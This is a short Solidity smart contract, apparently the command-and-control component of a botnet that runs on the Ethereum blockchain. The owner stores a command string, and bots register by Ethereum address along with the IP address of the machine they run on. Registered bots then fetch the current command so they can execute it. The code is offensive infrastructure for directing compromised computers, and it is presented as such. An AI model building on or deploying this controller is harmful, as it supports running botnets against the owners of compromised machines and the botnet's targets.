pragma solidity >=0.4.0 <0.6.0;

/// @title Main contract for controlling bots
/// @author Doshmajhan
contract Controller {
    address owner;
    string command;
    
    struct Bot {
        uint last_checkin; // last time the bot reported back
        string ip_address;     // IP the bot is reporting back from
        bool initialized;    // if this bot has initialized yet
    }

    mapping(address => Bot) bots;

    constructor() public {
        owner = msg.sender;
    }

    /// @notice Sets the command for the bots to pull down
    /// @param new_command The new command to be stored
    function set_command(string memory new_command) public {
        require(msg.sender == owner, "Must be owner");
        command = new_command;
    }

    /// @notice Gets the current command stored for the bot to run
    /// @return The current stored command
    function get_command() public view returns (string memory) {
        require(bots[msg.sender].initialized, "Must be part of network");
        return command;
    }

    /// @notice Joins a bot to our network with the given ip address and eth address
    ///     each bot is unique to its eth address it was intialized from
    /// @param ip The ip address of the computer the bot is running on
    /// @return True if the join was successful
    function join(string memory ip) public {
        Bot storage bot = bots[msg.sender];
        require(!bot.initialized, "This address has already been initialized");
        bot.ip_address = ip;
        bot.last_checkin = now;
        bot.initialized = true;
    }

    /// @notice Checks if the sender address is joined as a bot
    /// @param bot_address The address to check if it belongs to a bot
    /// @return True if join, false if not
    function is_joined(address bot_address) public view returns (bool) {
        return bots[bot_address].initialized;
    }

    function fund() public payable { }
}